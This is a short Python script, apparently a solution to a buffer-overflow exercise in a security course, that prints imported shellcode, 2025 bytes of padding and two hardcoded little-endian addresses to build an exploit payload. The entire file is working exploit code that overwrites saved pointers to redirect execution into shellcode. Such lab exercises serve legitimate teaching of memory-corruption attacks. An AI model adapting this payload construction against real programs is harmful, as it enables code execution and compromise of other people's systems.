#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a" * 2025)
sys.stdout.buffer.write(pack("<II", 0xfffe8588, 0xfffe8d9c))